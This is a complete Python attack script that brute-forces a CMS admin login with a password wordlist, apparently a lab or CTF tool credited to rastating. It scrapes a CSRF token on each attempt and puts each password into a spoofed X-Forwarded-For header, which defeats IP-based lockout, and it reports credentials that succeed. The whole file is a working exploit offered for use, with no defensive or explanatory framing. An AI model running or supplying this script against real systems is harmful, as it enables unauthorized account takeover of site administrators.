#!/usr/bin/env python3

# credits to - > rastating
# check out his github here - > https://github.com/rastating

import re
import requests
from sys import argv, exit

if len(argv) < 4:
	print(f"usage: {argv[0]} <target> <username> <wordlist> ")
	print(f"example: {argv[0]} http://10.10.10.10 admin /usr/share/wordlists/rockyou.txt")
	exit(1)

target = argv[1]
login_url = target + '/admin/login'
username = argv[2]
wordlist = argv[3]



for password in open(wordlist, 'r'):
	password = password.strip()
	session = requests.Session()
	login_page = session.get(login_url)
	csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

	print('\033[31m[*]\033[0m Trying: {p}'.format(p=password))

	headers = {
		'X-Forwarded-For': password,
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
		'Referer': login_url
	}

	data = {
		'tokenCSRF': csrf_token,
		'username': username,
		'password': password,
		'save': ''
	}

	login_result = session.post(login_url, headers=headers, data=data, allow_redirects=False)

	if 'location' in login_result.headers:
		if '/admin/dashboard' in login_result.headers['location']:
			print('\nSUCCESS: Password found!')
			print('Use {u}:{p} to login.'.format(u=username, p=password))
			break
